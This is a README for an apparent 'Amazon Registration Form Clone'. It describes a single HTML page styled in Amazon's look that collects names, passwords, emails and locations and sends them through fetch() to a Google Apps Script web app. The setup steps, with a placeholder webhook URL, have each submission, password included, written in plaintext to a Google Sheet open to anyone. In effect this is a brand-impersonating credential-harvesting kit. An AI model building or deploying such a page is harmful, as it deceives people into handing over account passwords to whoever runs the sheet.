﻿# Amazon Registration Form Clone

A single-page, self-contained HTML registration form styled to match Amazon's visual identity. Submissions are sent directly to a **Google Sheet** via a Google Apps Script Web App.

---

## Files

| File | Description |
|------|-------------|
| `amazon-register.html` | The complete registration form (HTML + CSS + JS, no dependencies) |
| `README.md` | This file |

---

## Fields Collected

| Field | Maps to Sheet Column |
|-------|----------------------|
| Name (`userName`) | C |
| Password (`password`) | D |
| Email (`email`) | E |
| Country (`country`) | F |
| State (`state`) | G |
| City (`city`) | H |

An auto-generated `USR-XXXX` ID is added in column B by the Apps Script.

---

## How It Works

1. User fills in the form and clicks **Create your Amazon account**
2. JavaScript collects all field values into a JSON object
3. A `fetch()` POST request is sent to the Google Apps Script Web App URL
4. The Apps Script appends a new row to the **"User Directory"** sheet

---

## Setup

### 1. Google Apps Script

- Open your Google Sheet → **Extensions → Apps Script**
- Paste the `doPost(e)` function and deploy as a **Web App**
- Set **"Who has access"** to **Anyone**
- Copy the deployment `/exec` URL

### 2. Update the Webhook URL

Open `amazon-register.html` and update line ~487:

\\\js
const WEBHOOK_URL = "https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec";
\\\

Replace with your actual deployment URL.

### 3. Open in Browser

Just double-click `amazon-register.html` — no server or build step needed.

---

## Features

- Amazon-style dark header, orange accent, yellow CTA button
- Smooth orange focus glow on all inputs
- Live inline field validation with animated error messages
- Real-time password strength meter (Weak to Strong)
- Password show/hide toggle
- Button loading spinner while submitting
- Success panel animation after submission
- Toast notification (top-right corner)
- Mobile-responsive single-column layout
- Zero external dependencies — pure HTML, CSS, and JavaScript

---

## Notes

- Uses `mode: 'no-cors'` (required for Google Apps Script Web Apps)
- Because of `no-cors`, the response is opaque — the User ID returned by the sheet cannot be read client-side
- No backend or npm required — open the HTML file directly in any modern browser
